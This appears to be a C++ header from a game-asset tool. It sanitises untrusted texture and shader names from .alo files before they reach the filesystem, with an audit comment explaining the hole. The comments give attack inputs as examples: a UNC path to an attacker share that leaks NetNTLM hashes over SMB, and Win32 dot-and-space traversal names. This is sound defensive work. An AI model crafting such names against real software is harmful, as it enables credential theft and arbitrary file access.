#pragma once
#include <string>
#include <vector>

// Audit F-PATH (security): asset names embedded in an untrusted .alo (texture /
// shader filenames) used to flow VERBATIM into new PhysicalFile(...) -> CreateFile.
// A crafted name like "\\attacker\share\x" leaks the user's NetNTLM hash on open
// (outbound SMB), and "C:\..." opens an arbitrary local file. Sanitize the name
// to a safe relative form before ANY filesystem use so neither the verbatim sink
// nor the resolver fallback ever sees an absolute / UNC / parent-traversal path.
//
// Legitimate game asset names are relative and may contain interior backslashes
// (e.g. "FX\FOO.TGA"); those are kept as-is. Only absolute (C:\...), root- or
// UNC-rooted (\... , \\host\...), and ".." traversal names are rejected.

inline bool IsSafeRelativeAssetName(const std::string& n)
{
    if (n.empty()) return true;                       // empty -> harmless
    if (n[0] == '\\' || n[0] == '/') return false;    // root-relative or UNC start
    // Reject ANY colon: drive-absolute (C:\x), drive-RELATIVE (C:x — opens
    // against C:'s CWD), and NTFS alternate-data-streams (x.tga:bad). Legit
    // game asset names never contain a colon.
    if (n.find(':') != std::string::npos) return false;
    // Reject any segment made ONLY of dots and spaces. The obvious rule —
    // "is this segment exactly `..`" — is not enough on Win32, which strips
    // trailing dots and spaces from a path component: ".. \x" resolves to the
    // parent directory exactly like "../x", and so do "..  ", ". .", "...".
    // Enumerating the normalized forms is a losing game, and no legitimate
    // asset name has a component without at least one ordinary character, so
    // reject the whole class and fail closed.
    size_t segStart = 0;
    for (size_t i = 0; i <= n.size(); ++i)
    {
        const bool atEnd = (i == n.size());
        if (!atEnd && n[i] != '\\' && n[i] != '/') continue;
        bool dotsOnly = (i > segStart);               // non-empty segment
        for (size_t j = segStart; j < i && dotsOnly; ++j)
            if (n[j] != '.' && n[j] != ' ') dotsOnly = false;
        if (dotsOnly) return false;
        segStart = i + 1;
    }
    return true;
}

// Unsafe names are reduced to their basename (everything after the last
// slash/backslash/colon), which the normal mod-root resolver then handles exactly
// like any other relative name. A separator-less unsafe name (e.g. "..") has no
// basename to strip and is returned as-is — harmless at the sole call site
// (main.cpp's already-traversal-guarded sink). Safe names pass through unchanged.
inline std::string SanitizeAssetName(std::string n)
{
    if (IsSafeRelativeAssetName(n)) return n;
    // Reduce to the trailing component after the last separator OR colon, so a
    // colon-without-slash drive-relative / ADS name (C:foo, x.tga:bad) is also
    // cut down, not just slash-bearing absolute/UNC names.
    size_t p = n.find_last_of("\\/:");
    return (p == std::string::npos) ? n : n.substr(p + 1);
}

inline std::vector<std::string> SafeTextureCandidates(const std::string& bareName)
{
    if (bareName.empty() || !IsSafeRelativeAssetName(bareName)) return {};

    std::string asDds = bareName;
    const size_t dot = asDds.rfind('.');
    if (dot != std::string::npos) asDds = asDds.substr(0, dot) + ".dds";

    std::vector<std::string> out;
    out.reserve(4);
    out.push_back("Data\\Art\\Textures\\" + bareName);
    out.push_back("Data\\Art\\Textures\\" + asDds);
    out.push_back(bareName);
    out.push_back(asDds);
    return out;
}
